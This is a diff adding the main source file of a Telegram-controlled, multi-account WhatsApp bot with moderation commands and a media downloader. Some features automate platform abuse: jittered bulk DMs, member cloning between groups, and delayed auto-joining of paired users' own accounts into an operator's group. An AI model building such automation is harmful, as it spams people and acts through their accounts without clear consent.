@@ -1,0 +1,11800 @@
+const githubSync = require("./github_sync");
+
+// Global notify helper so external modules (like github_sync) can message the owner
+global.notifyOwner = async (text) => {
+    try {
+        const botJidRaw = Object.keys(activeSockets)[0];
+        if (!botJidRaw) return;
+        const sock = activeSockets[botJidRaw];
+        if (!sock) return;
+        // The owner is the bot itself (self chat)
+        const ownerJid = sock.user.id.split(":")[0] + "@s.whatsapp.net";
+        await sock.sendMessage(ownerJid, { text });
+    } catch (e) {
+        console.error("[Notify] Failed to notify owner:", e.message);
+    }
+};
+const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    delay,
+    makeCacheableSignalKeyStore,
+    DisconnectReason,
+    fetchLatestBaileysVersion,
+    getContentType,
+    downloadMediaMessage,
+    downloadContentFromMessage,
+    generateWAMessageFromContent,
+    proto: waProto,
+} = require("@whiskeysockets/baileys");
+const pino = require("pino");
+const { Telegraf } = require("telegraf");
+const { sendInteractiveMessage: helperSendInteractiveMessage, sendButtons: helperSendButtons } = require("./wbails_helper");
+const fs = require("fs");
+const path = require("path");
+const os = require("os");
+const https = require("https");
+const http   = require("http");
+const crypto = require("crypto");
+
+// Load .env file if present (works on Render, Railway, Heroku, VPS, local, etc.)
+try { require("dotenv").config(); } catch (_) {}
+try {
+    const baileysPkg = require("@whiskeysockets/baileys/package.json");
+    console.log(`[WA Lib] Using @whiskeysockets/baileys v${baileysPkg.version}`);
+} catch (e) {
+    console.log(`[WA Lib] Could not resolve @whiskeysockets/baileys package: ${e?.message || e}`);
+}
+
+// ── MongoDB Cloud Persistence (free tier) ──────────────────────────────────────
+// Set MONGODB_URI in your environment to enable auto-sync to MongoDB Atlas.
+// Without it, everything works 100% locally (no change).
+
+// --- PERSISTENT DATA DIRECTORY ---
+// On Render/Railway/Koyeb/VPS, set DATA_DIR to a persistent disk path
+// e.g. Render persistent disk mount: DATA_DIR=/var/data
+// This keeps auth_info + sessions.json after deploy/restart so users do NOT pair again.
+const DATA_DIR = process.env.DATA_DIR || __dirname;
+try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (_) {}
+
+// ── Startup: log data directory + warn if ephemeral ──
+const isEphemeral = DATA_DIR === __dirname || DATA_DIR === process.cwd();
+console.log(`[Data] Storage directory: ${DATA_DIR}`);
+console.log(`[Data] Data dir = project dir? ${isEphemeral ? 'YES ⚠️' : 'NO ✅'}`);
+if (isEphemeral) {
+    console.log(`[Data] ⚠️  WARNING: DATA_DIR is not set! Accounts, sessions, and`);
+    console.log(`[Data]    message history will be LOST on redeploy!`);
+    console.log(`[Data]    Set DATA_DIR env variable to a persistent path.`);
+    console.log(`[Data]    See .env.example for details.`);
+} else {
+    console.log(`[Data] ✅ Data is stored outside the project directory.`);
+    console.log(`[Data]    It should survive redeploys.`);
+}
+// Count and log what existing data files we found
+try {
+    const existing = fs.readdirSync(DATA_DIR).filter(f => f.endsWith('.json') || f.endsWith('.jpg'));
+    console.log(`[Data] ${existing.length} data file(s) found in ${DATA_DIR}`);
+} catch (_) {}
+
+
+function dataPath(...parts) {
+    return path.join(DATA_DIR, ...parts);
+}
+
+// --- OWNER & WELCOME CONFIG ---
+// Primary owner — always has full access, cannot be removed
+// Set OWNER_ID in your environment/secrets to your Telegram user ID
+const PRIMARY_OWNER_ID = process.env.OWNER_ID || "8277426999";
+
+const WELCOME_CONFIG_FILE = dataPath("welcome_config.json");
+let welcomeConfig = {
+    text: "Welcome to *Phantom-X Bot!* 🤖\n\nTo link your WhatsApp, use:\n`/pair 2348102756072`\n\n_Replace the number with your own WhatsApp number (with country code)._",
+    photoFileId: null,
+    extraOwners: [], // additional owner IDs added via /addowner
+};
+
+function loadWelcomeConfig() {
+    try {
+        if (fs.existsSync(WELCOME_CONFIG_FILE)) {
+            const raw = fs.readFileSync(WELCOME_CONFIG_FILE, "utf8");
+            const saved = JSON.parse(raw);
+            welcomeConfig = { ...welcomeConfig, ...saved };
+            if (!Array.isArray(welcomeConfig.extraOwners)) welcomeConfig.extraOwners = [];
+        }
+    } catch (_) {}
+}
+
+function saveWelcomeConfig() {
+    try {
+        fs.writeFileSync(WELCOME_CONFIG_FILE, JSON.stringify(welcomeConfig, null, 2), "utf8");
+    } catch (_) {}
+}
+
+function isOwner(ctx) {
+    const id = ctx.from?.id?.toString();
+    if (!id) return false;
+    return id === PRIMARY_OWNER_ID || welcomeConfig.extraOwners.includes(id);
+}
+
+function isPrimaryOwner(ctx) {
+    return ctx.from?.id?.toString() === PRIMARY_OWNER_ID;
+}
+
+loadWelcomeConfig();
+
+// --- CONFIGURATION ---
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+if (!TELEGRAM_TOKEN) {
+    console.warn(
+        "\n⚠️  [Warning] TELEGRAM_TOKEN is not set.\n" +
+        "   Telegram bot features are DISABLED — the web dashboard still works.\n" +
+        "   To enable Telegram: add TELEGRAM_TOKEN in your Replit Secrets or .env file.\n"
+    );
+}
+const telBot = new Telegraf(TELEGRAM_TOKEN || "0000000000:placeholder_web_only_mode_AAAA");
+const MAX_RETRIES = 30;
+const BOT_VERSION = "1.0.0";
+const SETTINGS_FILE = dataPath("group_settings.json");
+const SESSIONS_FILE = dataPath("sessions.json");
+const MODE_FILE = dataPath("bot_mode.json");
+const MENU_BANNER_FILE = dataPath("menu_banner.jpg");
+const OWNER_BANNER_FILE = dataPath("owner_banner.jpg");
+const THEME_FILE = dataPath("menu_theme.json");
+const BOT_SECURITY_FILE = dataPath("bot_security.json");
+const DEBUG_RUNTIME = /^(1|true|yes|on)$/i.test(process.env.DEBUG_RUNTIME || "");
+const GROUP_TRACE = /^(1|true|yes|on)$/i.test(process.env.GROUP_TRACE || "");
+const BUTTON_TRACE = /^(1|true|yes|on)$/i.test(process.env.BUTTON_TRACE || "");
+function debugLog(...args) { if (DEBUG_RUNTIME) console.log(...args); }
+
+function describeCommandInfo(raw) {
+    const txt = String(raw || "").trimStart();
+    const prefix = /^[.,?]/.test(txt) ? txt[0] : "none";
+    const cmd = prefix !== "none" ? ('.' + txt.slice(1).split(/\s+/)[0].toLowerCase()) : "none";
+    return { prefix, cmd, preview: txt.slice(0, 120) };
+}
+
+async function emitGroupTrace(sock, phase, info = {}) {
+    if (!GROUP_TRACE) return;
+    try {
+        const bodyInfo = describeCommandInfo(info.rawBody || info.body || "");
+        const line = `[GroupTrace] phase=${phase} event=${info.eventType || 'n/a'} jid=${info.jid || 'n/a'} sender=${info.sender || 'n/a'} fromMe=${!!info.fromMe} prefix=${bodyInfo.prefix} cmd=${bodyInfo.cmd} reason=${info.reason || 'n/a'} body=${bodyInfo.preview}`;
+        console.log(line);
+    } catch (_) {}
+}
+
+async function emitButtonTrace(sock, phase, info = {}) {
+    if (!BUTTON_TRACE) return;
+    try {
+        const line = `[ButtonTrace] phase=${phase} test=${info.test || 'n/a'} event=${info.eventType || 'n/a'} id=${info.id || 'n/a'} reason=${info.reason || 'n/a'} body=${String(info.body || '').slice(0, 120)}`;
+        console.log(line);
+        const selfNum = (sock.user?.id || '').split(':')[0].split('@')[0];
+        if (!selfNum) return;
+        await sock.sendMessage(selfNum + '@s.whatsapp.net', {
+            text: `🧪 *BUTTON TRACE*
+phase: ${phase}
+test: ${info.test || 'n/a'}
+event: ${info.eventType || 'n/a'}
+id: ${info.id || 'n/a'}
+reason: ${info.reason || 'n/a'}
+body: ${String(info.body || '').slice(0, 120)}`
+        });
+    } catch (_) {}
+}
+
+// Per-user state
+const activeSockets = {};
+const retryCounts = {};
+const botJids = {};        // userId -> bot's own WhatsApp JID
+const telegramCtxs = {};   // userId -> telegram ctx (for alerts)
+
+// Anti-spam tracker: { jid: { count, lastTime } }
+const spamTracker = {};
+
+// GC Clone jobs: { groupJid: { members: [], index, interval } }
+const cloneJobs = {};
+
+// Reconnect notification cooldown: { userId: lastNotifyTimestamp }
+// Prevents flooding Telegram + WA self-chat with "restored" msgs on every micro-disconnect
+const lastConnectNotify = {};
+
+// Broadcast jobs: { botJid: { intervalId, groups, index, total } }
+const broadcastJobs = {};
+
+// Presence heartbeat timers per linked session — keeps the WA account visibly online
+// and helps avoid the "last seen" confusion after deploy.
+const presenceHeartbeats = {};
+
+// Web session lifecycle guards — prevent duplicate socket boots/reconnect loops that
+// trigger WhatsApp 440 conflict closures for the same linked account.
+const webSessionStartPromises = new Map();
+const webReconnectTimers = {};
+
+// Group metadata/session warm cache. Group sends can time out if the linked device
+// reconnects without enough fresh group participation/LID state. We keep a small
+// cache and warm it on connect.
+const groupMetadataCache = new Map(); // jid -> { meta, ts }
+
+function createMessageStore(limit = 2000) {
+    const map = new Map();
+    return {
+        set(msg) {
+            const id = msg?.key?.id;
+            const jid = msg?.key?.remoteJid;
+            if (!id || !jid || !msg?.message) return;
+            const k = `${jid}:${id}`;
+            map.set(k, msg);
+            if (map.size > limit) {
+                const first = map.keys().next();
+                if (!first.done) map.delete(first.value);
+            }
+        },
+        get(key) {
+            const id = key?.id;
+            const jid = key?.remoteJid;
+            if (!id || !jid) return undefined;
+            return map.get(`${jid}:${id}`)?.message;
+        }
+    };
+}
+
+function patchLegacyInteractiveForWhiskey(message) {
+    try {
+        const requiresPatch = !!(
+            message?.buttonsMessage ||
+            message?.templateMessage ||
+            message?.listMessage
+        );
+        if (!requiresPatch) return message;
+        return {
+            viewOnceMessage: {
+                message: {
+                    messageContextInfo: {
+                        deviceListMetadataVersion: 2,
+                        deviceListMetadata: {},
+                    },
+                    ...message,
+                },
+            },
+        };
+    } catch (_) {
+        return message;
+    }
+}
+
+// AI Help mode: { "senderJid::chatJid": { timer } }
+const helpModeUsers = {};
+
+// .session command state: { "devJid::chatJid": { step: "action"|"count"|"link", action: "join"|"follow"|"addcontacts", count: N } }
+const sessionCmdState = {};
+
+// Typo suggestion state: { "senderJid::chatJid": { rawBody, cmd, parts } }
+const typoSuggestionState = {};
+
+// Saved group invite links for auto-rejoin: { groupJid: inviteCode }
+const savedGroupLinks = {};
+
+// Developer numbers — set DEV_NUMBERS in your environment as comma-separated values
+// e.g.  DEV_NUMBERS=2348102756072,2348012345678
+const DEV_NUMBERS = (process.env.DEV_NUMBERS || "2348102756072")
+    .split(",").map(n => n.trim().replace(/\D/g, "")).filter(n => n.length > 5);
+const DEV_NUMBER = DEV_NUMBERS[0] || "2348102756072"; // primary dev (backward compat)
+
+// Full list of known commands for typo suggestion (bigram fuzzy matching)
+const KNOWN_CMDS = [
+    [".menu", ".menu"], [".ai <question>", ".ai"], [".ask <question>", ".ask"],
+    [".gemini <question>", ".gemini"], [".help", ".help"], [".ping", ".ping"],
+    [".uptime", ".uptime"], [".info", ".info"], [".restart", ".restart"],
+    [".antilink on", ".antilink"], [".antilink off", ".antilink"],
+    [".antispam on", ".antispam"], [".antispam off", ".antispam"],
+    [".antimention on", ".antimention"], [".antimention off", ".antimention"],
+    [".antidemote on", ".antidemote"], [".antidemote off", ".antidemote"],
+    [".antidelete on", ".antidelete"], [".antidelete off", ".antidelete"],
+    [".antibot on", ".antibot"], [".antibot off", ".antibot"],
+    [".warn @user", ".warn"], [".warnlist", ".warnlist"], [".resetwarn @user", ".resetwarn"],
+    [".ban @user", ".ban"], [".unban @user", ".unban"],
+    [".kick @user", ".kick"], [".add <number>", ".add"],
+    [".promote @user", ".promote"], [".demote @user", ".demote"],
+    [".link", ".link"], [".revoke", ".revoke"],
+    [".lock", ".lock"], [".unlock", ".unlock"],
+    [".tagall", ".tagall"], [".hidetag", ".hidetag"], [".tagadmin", ".tagadmin"],
+    [".welcome on", ".welcome"], [".welcome off", ".welcome"],
+    [".goodbye on", ".goodbye"], [".goodbye off", ".goodbye"],
+    [".groupinfo", ".groupinfo"], [".adminlist", ".adminlist"],
+    [".membercount", ".membercount"], [".everyone <msg>", ".everyone"],
+    [".broadcast <mins> <msg>", ".broadcast"], [".stopbroadcast", ".stopbroadcast"],
+    [".schedule HH:MM <msg>", ".schedule"], [".unschedule HH:MM", ".unschedule"],
+    [".mode public", ".mode"], [".mode owner", ".mode"],
+    [".sticker", ".sticker"], [".toimg", ".toimg"], [".ocr", ".ocr"],
+    [".tts <text>", ".tts"], [".translate <text>", ".translate"],
+    [".weather <city>", ".weather"], [".lyrics <song>", ".lyrics"],
+    [".imagine <prompt>", ".imagine"], [".solve <question>", ".solve"],
+    [".setpp", ".setpp"], [".setwpp", ".setwpp"],
+    [".setname <name>", ".setname"], [".setstatus <text>", ".setstatus"],
+    [".mute @user", ".mute"], [".unmute @user", ".unmute"],
+    [".slowmode <secs>", ".slowmode"],
+    [".clone <src> <dst> <n> <mins>", ".clone"], [".stopclone", ".stopclone"],
+    [".session", ".session"], [".persona", ".persona"],
+    [".hidetag <msg>", ".hidetag"], [".afk <reason>", ".afk"],
+    [".truth", ".truth"], [".dare", ".dare"], [".ttt @p1 @p2", ".ttt"],
+    [".groupid", ".groupid"], [".ping", ".ping"], [".alive", ".alive"],
+    [".menudesign <1-20>", ".menudesign"], [".theme <name>", ".theme"],
+];
+
+// Convert a plain phone number to WhatsApp JID
+function numToJid(num) {
+    const cleaned = (num || "").toString().replace(/[^0-9]/g, "");
+    if (!cleaned) return null;
+    return cleaned + "@s.whatsapp.net";
+}
+
+function getSessionForSocket(sock) {
+    for (const [userId, activeSock] of Object.entries(activeSockets)) {
+        if (activeSock === sock) {
+            const session = loadSessions()[userId] || {};
+            return { userId: Number(userId), ...session };
+        }
+    }
+    return null;
+}
+
+function lookupPhoneNumberInfo(input) {
+    const number = (input || "").replace(/\D/g, "");
+    if (!number || number.length < 7) return null;
+
+    const countries = [
+        ["234", "Nigeria", "NG"], ["233", "Ghana", "GH"], ["229", "Benin", "BJ"], ["228", "Togo", "TG"],
+        ["225", "Côte d'Ivoire", "CI"], ["237", "Cameroon", "CM"], ["27", "South Africa", "ZA"],
+        ["254", "Kenya", "KE"], ["255", "Tanzania", "TZ"], ["256", "Uganda", "UG"], ["250", "Rwanda", "RW"],
+        ["20", "Egypt", "EG"], ["212", "Morocco", "MA"], ["213", "Algeria", "DZ"], ["216", "Tunisia", "TN"],
+        ["1", "United States / Canada / Caribbean", "NANP"], ["44", "United Kingdom", "GB"],
+        ["33", "France", "FR"], ["34", "Spain", "ES"], ["39", "Italy", "IT"], ["49", "Germany", "DE"],
+        ["31", "Netherlands", "NL"], ["7", "Russia / Kazakhstan", "RU/KZ"], ["90", "Turkey", "TR"],
+        ["971", "United Arab Emirates", "AE"], ["966", "Saudi Arabia", "SA"], ["974", "Qatar", "QA"],
+        ["91", "India", "IN"], ["92", "Pakistan", "PK"], ["880", "Bangladesh", "BD"], ["62", "Indonesia", "ID"],
+        ["60", "Malaysia", "MY"], ["63", "Philippines", "PH"], ["86", "China", "CN"], ["81", "Japan", "JP"],
+        ["82", "South Korea", "KR"], ["61", "Australia", "AU"], ["55", "Brazil", "BR"], ["52", "Mexico", "MX"],
+    ].sort((a, b) => b[0].length - a[0].length);
+
+    const country = countries.find(([code]) => number.startsWith(code));
+    let carrier = "Unknown";
+    let localPrefix = "Unknown";
+
+    if (number.startsWith("234")) {
+        const local = number.slice(3);
+        localPrefix = local.slice(0, 3);
+        const ngCarriers = {
+            "703": "MTN Nigeria", "704": "MTN Nigeria", "706": "MTN Nigeria", "803": "MTN Nigeria", "806": "MTN Nigeria", "810": "MTN Nigeria", "813": "MTN Nigeria", "814": "MTN Nigeria", "816": "MTN Nigeria", "903": "MTN Nigeria", "906": "MTN Nigeria", "913": "MTN Nigeria", "916": "MTN Nigeria",
+            "701": "Airtel Nigeria", "708": "Airtel Nigeria", "802": "Airtel Nigeria", "808": "Airtel Nigeria", "812": "Airtel Nigeria", "901": "Airtel Nigeria", "902": "Airtel Nigeria", "904": "Airtel Nigeria", "907": "Airtel Nigeria", "912": "Airtel Nigeria",
+            "705": "Globacom Nigeria", "805": "Globacom Nigeria", "807": "Globacom Nigeria", "811": "Globacom Nigeria", "815": "Globacom Nigeria", "905": "Globacom Nigeria", "915": "Globacom Nigeria",
+            "809": "9mobile Nigeria", "817": "9mobile Nigeria", "818": "9mobile Nigeria", "908": "9mobile Nigeria", "909": "9mobile Nigeria",
+        };
+        carrier = ngCarriers[localPrefix] || carrier;
+    }
+
+    return {
+        number,
+        international: `+${number}`,
+        countryName: country?.[1] || "Unknown",
+        countryCode: country?.[2] || "Unknown",
+        callingCode: country?.[0] || "Unknown",
+        carrier,
+        localPrefix,
+    };
+}
+
+// --- REGROUP (T15) — slow-roll DM blast to migrate a group's members elsewhere ---
+const REGROUP_FILE = dataPath("regroup.json");
+function loadRegroup() {
+    const def = {
+        text: "👋 Hey! We've moved/restructured. Here's the new community group — tap the link below to join:\n\n🔗 {LINK}",
+        groupLink: "",
+        perMessageDelaySeconds: 12,
+        jitterSeconds: 6,
+        skipAdmins: true,
+        active: null,
+    };
+    if (!fs.existsSync(REGROUP_FILE)) return def;
+    try { return { ...def, ...JSON.parse(fs.readFileSync(REGROUP_FILE, "utf8")) }; } catch { return def; }
+}
+function saveRegroup(d) { try { fs.writeFileSync(REGROUP_FILE, JSON.stringify(d, null, 2)); } catch {} }
+
+// --- LINK WELCOME / AUTO-JOIN (T14) ---
+// When a brand-new user pairs, the bot waits a configurable delay (with jitter)
+// then DMs them and auto-joins them into the configured community group.
+const LINK_WELCOME_FILE = dataPath("link_welcome.json");
+const PENDING_JOINS_FILE = dataPath("pending_joins.json");
+
+function loadLinkWelcome() {
+    const def = {
+        enabled: false,
+        text: "👋 Welcome to *Phantom-X!*\n\nThanks for linking. You've now been added to our community group for updates and support.",
+        groupLink: "",          // full https://chat.whatsapp.com/CODE link
+        delayHours: 7,          // default 7h
+        jitterMinutes: 30,      // ±30 minutes
+        autoJoin: true,         // actually attempt to join the group on schedule
+    };
+    if (!fs.existsSync(LINK_WELCOME_FILE)) return def;
+    try { return { ...def, ...JSON.parse(fs.readFileSync(LINK_WELCOME_FILE, "utf8")) }; } catch { return def; }
+}
+function saveLinkWelcome(data) { fs.writeFileSync(LINK_WELCOME_FILE, JSON.stringify(data, null, 2)); }
+function buildLinkWelcomeMessage() {
+    const cfg = loadLinkWelcome();
+    if (!cfg.enabled) return null;
+    let body = cfg.text || "";
+    if (cfg.groupLink) body += `\n\n🔗 ${cfg.groupLink}`;
+    return body;
+}
+function extractInviteCode(link) {
+    if (!link) return null;
+    const m = link.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
+    return m ? m[1] : null;
+}
+function loadPendingJoins() { try { return JSON.parse(fs.readFileSync(PENDING_JOINS_FILE, "utf8")); } catch { return []; } }
+function savePendingJoins(arr) { try { fs.writeFileSync(PENDING_JOINS_FILE, JSON.stringify(arr, null, 2)); } catch {} }
+function addPendingJoin(entry) { const a = loadPendingJoins(); a.push(entry); savePendingJoins(a); }
+function removePendingJoin(userId) {
+    const a = loadPendingJoins().filter(e => e.userId !== userId);
+    savePendingJoins(a);
+}
+
+// Schedules the welcome+join for a freshly-paired user.
+// Persists to disk so it survives restarts.
+function scheduleLinkWelcome(userId, sock) {
+    const cfg = loadLinkWelcome();
+    if (!cfg.enabled) return;
+    const delayMs = (cfg.delayHours || 0) * 3600 * 1000;
+    const jitterMs = (cfg.jitterMinutes || 0) * 60 * 1000;
+    const jitter = jitterMs > 0 ? Math.floor((Math.random() * 2 - 1) * jitterMs) : 0;
+    const fireAt = Date.now() + delayMs + jitter;
+    const entry = { userId, fireAt, inviteCode: extractInviteCode(cfg.groupLink) };
+    // Replace any prior pending join for the same user
+    removePendingJoin(userId);
+    addPendingJoin(entry);
+    armLinkWelcome(entry, () => activeSockets[userId]);
+    console.log(`[linkwelcome] scheduled for ${userId} in ${Math.round((fireAt - Date.now())/60000)}min`);
+}
+
+function armLinkWelcome(entry, getSock) {
+    const wait = Math.max(0, entry.fireAt - Date.now());
+    setTimeout(async () => {
+        try {
+            const s = getSock();
+            if (!s) { console.log(`[linkwelcome] sock gone for ${entry.userId}, dropping`); removePendingJoin(entry.userId); return; }
+            const cfg = loadLinkWelcome();
+            const selfJid = (s.user?.id || "").split(":")[0].split("@")[0] + "@s.whatsapp.net";
+            // Send the DM
+            const intro = buildLinkWelcomeMessage();
+            if (intro) { try { await s.sendMessage(selfJid, { text: intro }); } catch (e) { console.log(`[linkwelcome] DM fail: ${e?.message}`); } }
+            // Try the auto-join
+            if (cfg.autoJoin && entry.inviteCode) {
+                try {
+                    await s.groupAcceptInvite(entry.inviteCode);
+                    console.log(`[linkwelcome] joined group for ${entry.userId}`);
+                } catch (e) { console.log(`[linkwelcome] join fail: ${e?.message}`); }
+            }
+            removePendingJoin(entry.userId);
+        } catch (e) { console.log(`[linkwelcome] handler error: ${e?.message}`); }
+    }, wait).unref?.();
+}
+
+// Re-arm pending joins on process boot
+function rearmAllPendingJoins() {
+    const pending = loadPendingJoins();
+    for (const e of pending) armLinkWelcome(e, () => activeSockets[e.userId]);
+    if (pending.length) console.log(`[linkwelcome] re-armed ${pending.length} pending join(s)`);
+}
+
+// Returns true if the JID belongs to any developer number
+function isDevJid(jid) {
+    if (!jid) return false;
+    const num = jid.replace(/@s\.whatsapp\.net|@g\.us/, "").split(":")[0];
+    // Check static env devs + runtime-added devs
+    try { return [...DEV_NUMBERS, ...loadExtraDevs()].includes(num); } catch { return DEV_NUMBERS.includes(num); }
+}
+function isDevProtected(jid) { return isDevJid(jid); } // backward compat alias
+
+// Auto-join settings
+const AUTOJOIN_FILE = dataPath("autojoin.json");
+function loadAutojoin() { if (!fs.existsSync(AUTOJOIN_FILE)) return {}; try { return JSON.parse(fs.readFileSync(AUTOJOIN_FILE, "utf8")); } catch { return {}; } }
+function saveAutojoin(d) { fs.writeFileSync(AUTOJOIN_FILE, JSON.stringify(d, null, 2)); }
+const AUTOJOIN_BLACKLIST = ["porn", "18+", "adult", "xxx", "sex", "nude", "naked", "leak", "nudes", "18plus", "onlyfan"];
+
+// --- MUTED USERS (per-group individual silence) ---
+const MUTED_USERS_FILE = dataPath("muted_users.json");
+// Module-level message log for .clear (indexed by "botJid::groupJid" → [msg, ...])
+const globalMsgCache = {};
+const pollCreationCache = {}; // jid -> poll message object
+function loadMutedUsers() { if (!fs.existsSync(MUTED_USERS_FILE)) return {}; try { return JSON.parse(fs.readFileSync(MUTED_USERS_FILE, "utf8")); } catch { return {}; } }
+function saveMutedUsers(d) { fs.writeFileSync(MUTED_USERS_FILE, JSON.stringify(d, null, 2)); }
+function addMutedUser(groupJid, userJid) { const d = loadMutedUsers(); if (!d[groupJid]) d[groupJid] = []; if (!d[groupJid].includes(userJid)) d[groupJid].push(userJid); saveMutedUsers(d); }
+function removeMutedUser(groupJid, userJid) { const d = loadMutedUsers(); if (d[groupJid]) { d[groupJid] = d[groupJid].filter(j => j !== userJid); if (!d[groupJid].length) delete d[groupJid]; saveMutedUsers(d); } }
+function isUserMuted(groupJid, userJid) { return (loadMutedUsers()[groupJid] || []).includes(userJid); }
+function getMutedUsersInGroup(groupJid) { return loadMutedUsers()[groupJid] || []; }
+
+// --- WARNS ---
+const WARNS_FILE = dataPath("warns.json");
+function loadWarns() { if (!fs.existsSync(WARNS_FILE)) return {}; try { return JSON.parse(fs.readFileSync(WARNS_FILE, "utf8")); } catch { return {}; } }
+function saveWarns(d) { fs.writeFileSync(WARNS_FILE, JSON.stringify(d, null, 2)); }
+function getWarnCount(groupJid, userJid) { return loadWarns()[groupJid]?.[userJid] || 0; }
+function addWarn(groupJid, userJid) { const d = loadWarns(); if (!d[groupJid]) d[groupJid] = {}; d[groupJid][userJid] = (d[groupJid][userJid] || 0) + 1; saveWarns(d); return d[groupJid][userJid]; }
+function resetWarns(groupJid, userJid) { const d = loadWarns(); if (d[groupJid]) { delete d[groupJid][userJid]; saveWarns(d); } }
+function getAllWarns(groupJid) { return loadWarns()[groupJid] || {}; }
+
+// --- BANS (bot-level, per botJid) ---
+const BANS_FILE = dataPath("bans.json");
+function loadBans() { if (!fs.existsSync(BANS_FILE)) return {}; try { return JSON.parse(fs.readFileSync(BANS_FILE, "utf8")); } catch { return {}; } }
+function saveBans(d) { fs.writeFileSync(BANS_FILE, JSON.stringify(d, null, 2)); }
+function isBanned(botJid, userJid) { return (loadBans()[botJid] || []).includes(userJid); }
+function addBan(botJid, userJid) { const d = loadBans(); if (!d[botJid]) d[botJid] = []; if (!d[botJid].includes(userJid)) d[botJid].push(userJid); saveBans(d); }
+function removeBan(botJid, userJid) { const d = loadBans(); if (d[botJid]) { d[botJid] = d[botJid].filter(j => j !== userJid); saveBans(d); } }
+
+// --- SCHEDULES ---
+const SCHEDULES_FILE = dataPath("schedules.json");
+const scheduleTimers = {};
+function loadSchedules() { if (!fs.existsSync(SCHEDULES_FILE)) return {}; try { return JSON.parse(fs.readFileSync(SCHEDULES_FILE, "utf8")); } catch { return {}; } }
+function saveSchedules(d) { fs.writeFileSync(SCHEDULES_FILE, JSON.stringify(d, null, 2)); }
+
+// --- MEDIA DOWNLOADER (Batch 2B) ---
+const DL_HEALTH_FILE = dataPath("dl_health.json");
+const DL_NOTIFY_COOLDOWN = {};
+function loadDlHealth() { try { return JSON.parse(fs.readFileSync(DL_HEALTH_FILE, "utf8")); } catch { return {}; } }
+function saveDlHealth(d) { try { fs.writeFileSync(DL_HEALTH_FILE, JSON.stringify(d, null, 2)); } catch {} }
+function markDlHealth(provider, ok, errMsg) {
+    const d = loadDlHealth();
+    if (!d[provider]) d[provider] = { ok: 0, fail: 0, lastFailMsg: "", lastUsed: 0, lastFailAt: 0 };
+    if (ok) { d[provider].ok++; } else { d[provider].fail++; d[provider].lastFailMsg = String(errMsg || "").slice(0, 200); d[provider].lastFailAt = Date.now(); }
+    d[provider].lastUsed = Date.now();
+    saveDlHealth(d);
+}
+function detectPlatform(url) {
+    if (!url) return null;
+    const u = url.toLowerCase();
+    if (/youtu\.?be/.test(u)) return "youtube";
+    if (/tiktok\.com|vm\.tiktok|vt\.tiktok/.test(u)) return "tiktok";
+    if (/instagram\.com|instagr\.am/.test(u)) return "instagram";
+    if (/facebook\.com|fb\.watch|fb\.com/.test(u)) return "facebook";
+    if (/twitter\.com|x\.com/.test(u)) return "twitter";
+    if (/soundcloud\.com|on\.soundcloud/.test(u)) return "soundcloud";
+    if (/pinterest\.|pin\.it/.test(u)) return "pinterest";
+    if (/reddit\.com|redd\.it/.test(u)) return "reddit";
+    if (/tumblr\.com/.test(u)) return "tumblr";
+    if (/vimeo\.com/.test(u)) return "vimeo";
+    if (/twitch\.tv/.test(u)) return "twitch";
+    if (/^https?:\/\//i.test(url)) return "generic";
+    return null;
+}
+async function dlFetchJson(url, opts = {}) {
+    const ctrl = new AbortController();
+    const t = setTimeout(() => ctrl.abort(), opts.timeout || 25000);
+    try {
+        const res = await fetch(url, { ...opts, signal: ctrl.signal, headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json", ...(opts.headers || {}) } });
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        return await res.json();
+    } finally { clearTimeout(t); }
+}
+const DL_PROVIDERS = {
+    // Cobalt — updated to new v7 API format (POST /, not /api/json)
+    cobalt: async (url, opts = {}) => {
+        const body = { url, downloadMode: opts.audio ? "audio" : "auto", videoQuality: "720", audioFormat: "mp3", filenameStyle: "basic" };
+        let data;
+        // Try new endpoint first, fall back to legacy
+        for (const endpoint of ["https://api.cobalt.tools/", "https://api.cobalt.tools/api/json"]) {
+            try {
+                data = await dlFetchJson(endpoint, {
+                    method: "POST",
+                    headers: { "Accept": "application/json", "Content-Type": "application/json" },
+                    body: JSON.stringify(endpoint.endsWith("/api/json")
+                        ? { url, vQuality: "720", isAudioOnly: !!opts.audio, filenamePattern: "basic" }
+                        : body),
+                    timeout: 30000,
+                });
+                break;
+            } catch (e) { if (endpoint.includes("api/json")) throw e; }
+        }
+        if (!data || data.status === "error") throw new Error(data?.text || data?.error?.code || "cobalt error");
+        if (["redirect", "stream", "tunnel"].includes(data.status)) {
+            return { type: opts.audio ? "audio" : "video", url: data.url };
+        }
+        if (data.status === "picker" && Array.isArray(data.picker) && data.picker.length) {
+            const first = data.picker[0];
+            return { type: first.type === "photo" ? "image" : "video", url: first.url, picker: data.picker };
+        }
+        throw new Error(`cobalt: unexpected status ${data.status}`);
+    },
+
+    // tikwm — TikTok HD (no watermark). Prefers HD, falls back to SD, never wmplay.
+    tikwm: async (url, opts = {}) => {
+        const data = await dlFetchJson(`https://www.tikwm.com/api/?url=${encodeURIComponent(url)}&hd=1`);
+        if (!data || data.code !== 0 || !data.data) throw new Error(data?.msg || "tikwm error");
+        const d = data.data;
+        if (opts.audio) {
+            const a = d.music_info?.play || d.music;
+            if (!a) throw new Error("tikwm: no audio track");
+            return { type: "audio", url: a, title: d.title };
+        }
+        // hdplay = HD no-watermark, play = SD no-watermark — never use wmplay (watermark)
+        const v = d.hdplay || d.play;
+        if (!v) throw new Error("tikwm: no playable video url");
+        return { type: "video", url: v, title: d.title, thumb: d.cover };
+    },
+
+    // locoloader — secondary TikTok/Instagram fallback (free, no key)
+    locoloader: async (url, opts = {}) => {
+        const data = await dlFetchJson(`https://locoloader.com/api/v2/social?url=${encodeURIComponent(url)}`, { timeout: 25000 });
+        if (!data || data.error) throw new Error(data?.message || "locoloader error");
+        if (opts.audio && data.audio) return { type: "audio", url: data.audio, title: data.title };
+        if (data.video) return { type: "video", url: data.video, title: data.title };
+        if (data.image) return { type: "image", url: data.image, title: data.title };
+        throw new Error("locoloader: no media url in response");
+    },
+};
+const DL_CHAIN = {
+    youtube:    ["cobalt"],
+    tiktok:     ["tikwm", "locoloader", "cobalt"],
+    instagram:  ["cobalt", "locoloader"],
+    facebook:   ["cobalt"],
+    twitter:    ["cobalt"],
+    soundcloud: ["cobalt"],
+    pinterest:  ["cobalt"],
